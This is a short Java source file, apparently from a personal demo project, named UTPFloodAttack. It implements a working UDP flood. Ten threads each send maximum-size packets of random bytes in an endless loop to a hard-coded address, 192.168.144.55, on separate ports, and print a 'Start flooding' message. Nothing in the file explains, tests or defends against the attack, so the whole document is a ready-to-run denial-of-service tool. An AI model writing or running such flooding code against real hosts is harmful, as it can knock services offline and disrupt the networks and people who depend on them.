package com.dhanushkad.demo;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.security.SecureRandom;

public class UTPFloodAttack {
    public static void main(String args[]) throws MalformedURLException {
        UDPSendingThread requestThread1 = new UDPSendingThread(4465);
        UDPSendingThread requestThread2 = new UDPSendingThread(55466);
        UDPSendingThread requestThread3 = new UDPSendingThread(55465);
        UDPSendingThread requestThread4 = new UDPSendingThread(55464);
        UDPSendingThread requestThread5 = new UDPSendingThread(55463);
        UDPSendingThread requestThread6 = new UDPSendingThread(55462);
        UDPSendingThread requestThread7 = new UDPSendingThread(55461);
        UDPSendingThread requestThread8 = new UDPSendingThread(55469);
        UDPSendingThread requestThread9 = new UDPSendingThread(55468);
        UDPSendingThread requestThread10 = new UDPSendingThread(55467);

        requestThread1.start();
        requestThread2.start();
        requestThread3.start();
        requestThread4.start();
        requestThread5.start();
        requestThread6.start();
        requestThread7.start();
        requestThread8.start();
        requestThread9.start();
        requestThread10.start();

    }
}

class UDPSendingThread extends Thread {

    String ip = "192.168.144.55";
    int port = 0;

    UDPSendingThread (int port) {
        this.port = port;
    }

    public void run() {
        while (true) {
            DatagramSocket socket = null;
            InetAddress address = null;
            byte[] buf = new byte[65507];
            SecureRandom random = new SecureRandom();

            try {
                socket = new DatagramSocket();
            } catch (SocketException e) {
                e.printStackTrace();
            }

            try {
                address = InetAddress.getByName(ip);
            } catch (UnknownHostException e) {
                e.printStackTrace();
            }

            random.nextBytes(buf);
            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, port);

            try {
                System.out.printf("[*] Start flooding %s:%d\n", ip, port);
                while (true) {
                    socket.send(packet);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            socket.close();

        }
    }
}
